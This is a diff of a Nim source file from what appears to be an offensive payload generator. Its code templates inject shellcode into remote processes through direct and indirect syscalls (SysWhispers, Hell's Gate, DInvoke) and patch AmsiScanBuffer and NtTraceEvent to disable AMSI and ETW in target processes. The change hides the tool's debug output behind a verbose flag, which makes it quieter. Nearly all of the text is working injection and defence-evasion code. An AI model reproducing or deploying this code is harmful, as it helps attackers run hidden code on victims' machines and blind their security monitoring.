@@ -48,50 +48,59 @@ let ShellcoderemoteinjectStub * = """
     when defined(SysWhispers):
         status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
-        echo obf("[*] opqiwepoausdasdjl: "), status
+        when defined(verbose):
+            echo obf("[*] opqiwepoausdasdjl: "), status
 
         status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
-        echo obf("[*] opqiwepoausdasdjl: "), status
+        when defined(verbose):
+            echo obf("[*] opqiwepoausdasdjl: "), status
         var bytesWritten: SIZE_T
 
         status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
-        echo obf("[*] oqiazasusjk: "), status
-        echo obf("    \\-- bytes written: "), bytesWritten
-        echo obf("")
+        when defined(verbose):
+            echo obf("[*] oqiazasusjk: "), status
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
 
         status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,ds,NULL, FALSE, 0, 0, 0, NULL)
 
         status = zuatzuastdiasyy(tHandle)
         status = zuatzuastdiasyy(pHandle)
 
-        echo success
+        when defined(verbose):
+            echo success
     else:
 
         when defined(Hellsgate):
             if getSyscall(ntOpenTable):
                 syscall = ntOpenTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtOpenProcess")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtOpenProcess")
     
         status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
-        echo obf("[*] NtOpenProcess: "), status
+        when defined(verbose):
+            echo obf("[*] NtOpenProcess: "), status
     
         when defined(Hellsgate):
             if getSyscall(ntAllocTable):
                 syscall = ntAllocTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
         status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
-        echo obf("[*] NtOpenProcess: "), status
+        when defined(verbose):
+            echo obf("[*] NtOpenProcess: "), status
         var bytesWritten: SIZE_T
 
         when defined(Hellsgate):
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
         status = NtWriteVirtualMemory(
             pHandle, 
@@ -100,15 +109,17 @@ let ShellcoderemoteinjectStub * = """
             sc_size-1, 
             addr bytesWritten)
 
-        echo obf("[*] NtWriteVirtualMemory: "), status
-        echo obf("    \\-- bytes written: "), bytesWritten
-        echo obf("")
+        when defined(verbose):
+            echo obf("[*] NtWriteVirtualMemory: "), status
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
     
         when defined(Hellsgate):
             if getSyscall(ntCreateTable):
                 syscall = ntCreateTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtCreateThreadEx")
 
         status = NtCreateThreadEx(
             &tHandle, 
@@ -122,12 +133,14 @@ let ShellcoderemoteinjectStub * = """
             if getSyscall(ntCloseTable):
                 syscall = ntCloseTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtClose")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtClose")
 
         status = NtClose(tHandle)
         status = NtClose(pHandle)
 
-        echo success
+        when defined(verbose):
+            echo success
    
 
 when isMainModule:
@@ -168,7 +181,8 @@ proc FindPidByName * (processName : string):DWORD =
                     if ($(entry.szExeFile).join()).contains(processName):
                         result = pid
     except: 
-        echo obf("Process ID not found")
+        when defined(verbose):
+            echo obf("Process ID not found")
 
 var processID: DWORD
 """
@@ -177,12 +191,14 @@ let ShellcoderemoteinjectStub_customprocID * = """
 var found: bool = false
 for m in remoteprocesses:
     if found == true: continue
-    echo obf("Checking: ") & $m
+    when defined(verbose):
+        echo obf("Checking: ") & $m
     processID = FindPidByName(m)
     if (processID):
         found = true
 
-echo obf("[*] Target Process: "), processID
+when defined(verbose):
+    echo obf("[*] Target Process: "), processID
 var remoteProcID: DWORD = processID
 """
 
@@ -216,12 +232,14 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
    
     var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
     if RemoteHandle == 0:
-        echo obf("[X] Failed to get amsi.dll handle")
+        when defined(verbose):
+            echo obf("[X] Failed to get amsi.dll handle")
         return disabled
 
     var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
     if RemoteProc == NULL:
-        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
+        when defined(verbose):
+            echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
     RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
     var oldProtection: DWORD = 0
@@ -239,9 +257,11 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[*] Applying Syscall AMSI patch")
+            when defined(verbose):
+                echo obf("[*] Applying Syscall AMSI patch")
 
         var bytesWritten: SIZE_T
 
@@ -249,16 +269,20 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] oqiazasusjk Succeed!")
+            when defined(verbose):
+                echo obf("[+] oqiazasusjk Succeed!")
                 
         status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] OldProtect set back")
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
             disabled = true
         return disabled
 
@@ -288,14 +312,17 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
             if getSyscall(ntProtectTable):
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
     
         status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[*] Applying Syscall AMSI patch")
+            when defined(verbose):
+                echo obf("[*] Applying Syscall AMSI patch")
     
 
         var bytesWritten: SIZE_T
@@ -304,28 +331,34 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
         var outLength: SIZE_T
         status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] NtWriteVirtualMemory Succeed!")
+            when defined(verbose):
+                echo obf("[+] NtWriteVirtualMemory Succeed!")
 
         when defined(Hellsgate):
             if getSyscall(ntProtectTable):        
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
     
         status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
              
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] OldProtect set back")
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
             disabled = true
         return disabled
 
@@ -353,21 +386,24 @@ when isMainModule:
             if getSyscall(ntOpenTable):
                 syscall = ntOpenTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtOpenProcess")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtOpenProcess")
 
         status = NtOpenProcess(
             &hProcams,
             PROCESS_ALL_ACCESS, 
             &oa, &cid         
         )
-    echo obf("[*] NtOpenProcess: "), toHex(status)
+    when defined(verbose):
+        echo obf("[*] NtOpenProcess: "), toHex(status)
     #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
     if (success == 0):
         success = remoteLoadAmsi(remoteProcID)
         HowMuchTimeWouldYoulikeToSleep(2)
         success = RemotePatchAmsi(hProcams)
-    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
+    when defined(verbose):
+        echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
 
@@ -382,7 +418,8 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
      char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
      char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
     
-    echo obf("[*] Loading amsi.dll in the remote process: "), processID
+    when defined(verbose):
+        echo obf("[*] Loading amsi.dll in the remote process: "), processID
     var cid: CLIENT_ID
     var oa: OBJECT_ATTRIBUTES
     var pHandle: HANDLE
@@ -396,17 +433,20 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
     when defined(SysWhispers):
         status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
-        echo obf("[*] opqiwepoausdasdjl: "), status
+        when defined(verbose):
+            echo obf("[*] opqiwepoausdasdjl: "), status
 
         status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
-        echo obf("[*] oqiahsjynmxkla: "), status
+        when defined(verbose):
+            echo obf("[*] oqiahsjynmxkla: "), status
         var bytesWritten: SIZE_T
 
         status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
-        echo obf("[*] oqiazasusjk: "), status
-        echo obf("    \\-- bytes written: "), bytesWritten
-        echo obf("")
+        when defined(verbose):
+            echo obf("[*] oqiazasusjk: "), status
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
 
         var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
         status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
@@ -467,33 +507,38 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
             if getSyscall(ntOpenTable):
                 syscall = ntOpenTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtOpenProcess")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtOpenProcess")
 
         status = NtOpenProcess(
             &pHandle,
             PROCESS_ALL_ACCESS, 
             &oa, &cid         
         )
-        echo obf("[*] NtOpenProcess: "), toHex(status)
+        when defined(verbose):
+            echo obf("[*] NtOpenProcess: "), toHex(status)
 
         when defined(Hellsgate):
             if getSyscall(ntAllocTable):
                 syscall = ntAllocTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
         status = NtAllocateVirtualMemory(
             pHandle, &ds, 0, &sc_size, 
             MEM_COMMIT, 
             PAGE_EXECUTE_READWRITE)
-        echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+        when defined(verbose):
+            echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
         var bytesWritten: SIZE_T
 
         when defined(Hellsgate):
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
         status = NtWriteVirtualMemory(
             pHandle, 
@@ -502,9 +547,11 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
             sc_size-1, 
             addr bytesWritten)
 
-        echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
-        echo obf("    \\-- bytes written: "), bytesWritten
-        echo obf("")
+        when defined(verbose):
+            echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+        when defined(verbose):
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
         when defined(DInvoke):
             var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
         else:
@@ -514,7 +561,8 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
             if getSyscall(ntCreateTable):
                 syscall = ntCreateTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtCreateThreadEx")
 
         status = NtCreateThreadEx(
             &tHandle, 
@@ -523,7 +571,8 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
             pHandle,
             pfnThreadRtn, 
             ds, FALSE, 0, 0, 0, NULL)
-        echo obf("[*] NtCreateThreadEx: "), toHex(status)
+        when defined(verbose):
+            echo obf("[*] NtCreateThreadEx: "), toHex(status)
         status = NtClose(tHandle)
         status = NtClose(pHandle)
 
@@ -538,8 +587,9 @@ proc remoteLoadAmsi(processID: var DWORD): bool =
             else:
                 success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
             if (success):
-              echo obf("set back old protect")
-              echo success
+              when defined(verbose):
+                echo obf("set back old protect")
+                echo success
 
 """
 
@@ -559,12 +609,14 @@ proc RemotePatchETW(hProcss :HANDLE): bool =
    
     var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("ntdll.dll"))
     if RemoteHandle == 0:
-        echo obf("[X] Failed to get ntdll.dll handle")
+        when defined(verbose):
+            echo obf("[X] Failed to get ntdll.dll handle")
         return disabled
 
     var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("NtTraceEvent"))
     if RemoteProc == NULL:
-        echo obf("[X] Failed to get the address of 'NtTraceEvent'")
+        when defined(verbose):
+            echo obf("[X] Failed to get the address of 'NtTraceEvent'")
         return disabled
     
     var oldProtection: DWORD = 0
@@ -582,9 +634,11 @@ proc RemotePatchETW(hProcss :HANDLE): bool =
         status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[*] Applying Syscall ETW patch")
+            when defined(verbose):
+                echo obf("[*] Applying Syscall ETW patch")
 
         var bytesWritten: SIZE_T
 
@@ -592,16 +646,20 @@ proc RemotePatchETW(hProcss :HANDLE): bool =
         status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] oqiazasusjk Succeed!")
+            when defined(verbose):
+                echo obf("[+] oqiazasusjk Succeed!")
                 
         status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] OldProtect set back")
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
             disabled = true
         return disabled
 
@@ -631,14 +689,17 @@ proc RemotePatchETW(hProcss :HANDLE): bool =
             if getSyscall(ntProtectTable):
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
     
         status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[*] Applying Syscall ETW patch")
+            when defined(verbose):
+                echo obf("[*] Applying Syscall ETW patch")
     
 
         var bytesWritten: SIZE_T
@@ -647,28 +708,34 @@ proc RemotePatchETW(hProcss :HANDLE): bool =
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
         var outLength: SIZE_T
         status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
 
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to write memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to write memory.")
         else:
-            echo obf("[+] NtWriteVirtualMemory Succeed!")
+            when defined(verbose):
+                echo obf("[+] NtWriteVirtualMemory Succeed!")
 
         when defined(Hellsgate):
             if getSyscall(ntProtectTable):        
                 syscall = ntProtectTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
     
         status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
              
         if not NT_SUCCESS(status):
-            echo obf("[-] Failed to allocate memory.")
+            when defined(verbose):
+                echo obf("[-] Failed to allocate memory.")
         else:
-            echo obf("[+] OldProtect set back")
+            when defined(verbose):
+                echo obf("[+] OldProtect set back")
             disabled = true
         return disabled
 
@@ -699,14 +766,16 @@ when isMainModule:
             if getSyscall(ntOpenTable):
                 syscall = ntOpenTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtOpenProcess")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtOpenProcess")
 
         status = NtOpenProcess(
             &hProcams,
             PROCESS_ALL_ACCESS, 
             &oa, &cid         
         )
-    echo obf("[*] NtOpenProcess: "), toHex(status)
+    when defined(verbose):
+        echo obf("[*] NtOpenProcess: "), toHex(status)
     
     #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchETW(hProcams)
@@ -714,7 +783,8 @@ when isMainModule:
         success = remoteLoadNtdll(remoteProcID)
         HowMuchTimeWouldYoulikeToSleep(2)
         success = RemotePatchETW(hProcams)
-    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
+    when defined(verbose):
+        echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
 
@@ -730,7 +800,8 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
     char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
     char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
     
-    echo obf("[*] Loading ntdll.dll in the remote process: "), processID
+    when defined(verbose):
+        echo obf("[*] Loading ntdll.dll in the remote process: "), processID
     var cid: CLIENT_ID
     var oa: OBJECT_ATTRIBUTES
     var pHandle: HANDLE
@@ -744,17 +815,20 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
     when defined(SysWhispers):
         status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
-        echo obf("[*] opqiwepoausdasdjl: "), status
+        when defined(verbose):
+            echo obf("[*] opqiwepoausdasdjl: "), status
 
         status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
-        echo obf("[*] oqiahsjynmxkla: "), status
+        when defined(verbose):
+            echo obf("[*] oqiahsjynmxkla: "), status
         var bytesWritten: SIZE_T
 
         status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
-        echo obf("[*] oqiazasusjk: "), status
-        echo obf("    \\-- bytes written: "), bytesWritten
-        echo obf("")
+        when defined(verbose):
+            echo obf("[*] oqiazasusjk: "), status
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
 
         var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
         status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
@@ -815,33 +889,38 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
             if getSyscall(ntOpenTable):
                 syscall = ntOpenTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtOpenProcess")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtOpenProcess")
 
         status = NtOpenProcess(
             &pHandle,
             PROCESS_ALL_ACCESS, 
             &oa, &cid         
         )
-        echo obf("[*] NtOpenProcess: "), toHex(status)
+        when defined(verbose):
+            echo obf("[*] NtOpenProcess: "), toHex(status)
 
         when defined(Hellsgate):
             if getSyscall(ntAllocTable):
                 syscall = ntAllocTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
         status = NtAllocateVirtualMemory(
             pHandle, &ds, 0, &sc_size, 
             MEM_COMMIT, 
             PAGE_EXECUTE_READWRITE)
-        echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+        when defined(verbose):
+            echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
         var bytesWritten: SIZE_T
 
         when defined(Hellsgate):
             if getSyscall(ntWriteTable):
                 syscall = ntWriteTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
         status = NtWriteVirtualMemory(
             pHandle, 
@@ -850,9 +929,10 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
             sc_size-1, 
             addr bytesWritten)
 
-        echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
-        echo obf("    \\-- bytes written: "), bytesWritten
-        echo obf("")
+        when defined(verbose):
+            echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+            echo obf("    \\-- bytes written: "), bytesWritten
+            echo obf("")
         when defined(DInvoke):
             var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
         else:
@@ -862,7 +942,8 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
             if getSyscall(ntCreateTable):
                 syscall = ntCreateTable.wSysCall
             else:
-                echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+                when defined(verbose):
+                    echo obf("[-] Failed to find opcode for NtCreateThreadEx")
 
         status = NtCreateThreadEx(
             &tHandle, 
@@ -871,7 +952,8 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
             pHandle,
             pfnThreadRtn, 
             ds, FALSE, 0, 0, 0, NULL)
-        echo obf("[*] NtCreateThreadEx: "), toHex(status)
+        when defined(verbose):
+            echo obf("[*] NtCreateThreadEx: "), toHex(status)
         status = NtClose(tHandle)
         status = NtClose(pHandle)
 
@@ -886,7 +968,8 @@ proc remoteLoadNtdll(processID: var DWORD): bool =
             else:
                 success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
             if (success):
-              echo obf("set back old protect")
-              echo success
+              when defined(verbose):
+                echo obf("set back old protect")
+                echo success
 
 """
